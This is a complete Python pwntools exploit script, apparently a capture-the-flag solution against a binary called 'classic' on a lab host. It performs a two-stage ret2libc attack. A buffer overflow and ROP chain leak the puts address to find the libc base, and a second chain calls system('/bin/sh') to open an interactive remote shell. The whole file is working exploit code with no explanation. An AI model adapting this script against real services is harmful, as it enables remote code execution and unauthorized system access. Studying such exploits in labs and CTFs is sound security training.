from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

host = "10.213.0.102"
port = "41385"

# Load the binary and libc
elf = ELF('./classic')  # Your binary
libc = ELF('./libc.so')  # Your downloaded libc

# Automatically get all addresses from the binary
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

# Find ROP gadget automatically
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

print(f"[*] puts@plt: {hex(puts_plt)}")
print(f"[*] puts@got: {hex(puts_got)}")
print(f"[*] main: {hex(main_addr)}")
print(f"[*] pop rdi gadget: {hex(pop_rdi)}")

# Get libc offsets
system_offset = libc.symbols['system']
puts_offset = libc.symbols['puts']
binsh_offset = next(libc.search(b'/bin/sh'))

print(f"[*] system offset: {hex(system_offset)}")
print(f"[*] puts offset: {hex(puts_offset)}")
print(f"[*] /bin/sh offset: {hex(binsh_offset)}")

# Stage 1: Leak libc
print("\n[*] Stage 1: Leaking libc...")
p = remote(host, port)
p.recvuntil(b"Time to say something:")

payload = b"A" * 136
#payload += b"B" * 8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendline(payload)
p.recvuntil(b"Message sent\n")
puts_leak = u64(p.recv(6).ljust(8, b'\x00'))

# print(puts_leak)

# Calculate libc base
libc_base = puts_leak - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

print(f"[+] Puts leak: {hex(puts_leak)}")
print(f"[+] Libc base: {hex(libc_base)}")
print(f"[+] System: {hex(system_addr)}")
print(f"[+] /bin/sh: {hex(binsh_addr)}")

# Stage 2: Get shell
print("\n[*] Stage 2: Getting shell...")
p.recvuntil(b"Time to say something:")

payload = b"A" * 136
# payload += b"B" * 8
payload += p64(ret)  # Stack alignment
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()